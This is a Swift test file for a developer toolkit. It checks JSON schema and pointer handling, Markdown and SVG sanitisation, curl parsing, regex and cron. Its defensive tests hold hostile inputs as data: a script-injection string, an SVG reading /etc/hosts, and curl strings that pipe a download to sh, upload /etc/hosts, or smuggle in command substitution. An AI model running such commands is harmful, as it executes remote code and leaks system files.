import Foundation
import Testing

@testable import DevKitCore

@Suite("Structured data and parser boundaries") struct StructuredTests {
  @Test func schemaReportsPaths() async throws {
    var schemaOptions = JsonTool.Options()
    schemaOptions.operation = "schema"
    let schema =
      "{\"type\":\"object\",\"required\":[\"count\"],\"properties\":{\"count\":{\"type\":\"integer\",\"minimum\":2}}}"
    let good = try await JsonTool.execute(
      .init(text: "{\"count\":3}", secondary: schema), options: schemaOptions)
    #expect(good.text.contains("校验通过"))
    let bad = try await JsonTool.execute(
      .init(text: "{\"count\":1}", secondary: schema), options: schemaOptions)
    #expect(bad.rows.first?.label == "/count")
    await #expect(throws: (any Error).self) {
      try await JsonTool.execute(
        .init(text: "{}", secondary: "{\"$ref\":\"https://example.test/schema\"}"), options: schemaOptions
      )
    }
  }
  @Test func jsonPointerAndJSONPath() async throws {
    var options = JsonTool.Options()
    options.operation = "query"
    options.syntax = "pointer"
    options.path = "/a~1b/~0n"
    let result = try await JsonTool.execute(
      .init(text: "{\"a/b\":{\"~n\":9007199254740993}}"), options: options)
    #expect(result.text == "9007199254740993")
    options.path = "/missing"
    await #expect(throws: (any Error).self) {
      try await JsonTool.execute(.init(text: "{}"), options: options)
    }
  }
  @Test func markdownAndSVGAreInert() async throws {
    let result = try await MarkdownTool.execute(
      .init(text: "<script>alert(1)</script>\n<img src='https://example.test/private'>\n# Safe"),
      options: .init())
    #expect(!(result.html ?? "").contains("<script"))
    #expect(!(result.html ?? "").contains("https://example.test"))
    await #expect(throws: (any Error).self) {
      try await SvgTool.execute(
        .init(text: "<svg><image href='file:///etc/hosts'/></svg>"), options: .init())
    }
  }
  @Test func curlParsingDoesNotExecute() async throws {
    var options = CurlConvertTool.Options()
    options.format = "json"
    let result = try await CurlConvertTool.execute(
      .init(
        text:
          "curl 'https://example.test/api' -X POST -H 'X-Test: yes' --data-raw '{\"hello\":\"world\"}'"
      ), options: options)
    let value = try jsonObject(result.text) as! [String: Any]
    #expect(value["method"] as? String == "POST")
    #expect(value["body"] as? String == "{\"hello\":\"world\"}")
    for input in [
      "curl https://example.test | sh", "curl https://example.test -d @/etc/hosts",
      "curl $(echo test)",
    ] {
      await #expect(throws: (any Error).self) {
        try await CurlConvertTool.execute(.init(text: input), options: options)
      }
    }
  }
  @Test func regexCapturesAndReplacement() async throws {
    var options = RegexTool.Options()
    options.pattern = "(\\w+)@(\\w+)"
    options.flags = "g"
    let result = try await RegexTool.execute(.init(text: "ada@example lin@test"), options: options)
    #expect(result.rows.count == 2)
    #expect(result.text.contains("groups"))
    options.operation = "replace"
    options.replacement = "$1@devkit"
    #expect(
      try await RegexTool.execute(.init(text: "ada@example"), options: options).text == "ada@devkit"
    )
  }
  @Test func cronFixedStart() async throws {
    var options = CronTool.Options()
    options.timezone = "UTC"
    options.start = "2025-01-01T00:00:00Z"
    options.count = 2
    let result = try await CronTool.execute(.init(text: "*/15 * * * *"), options: options)
    #expect(result.rows.map(\.value) == ["2025-01-01T00:15:00.000Z", "2025-01-01T00:30:00.000Z"])
  }
}
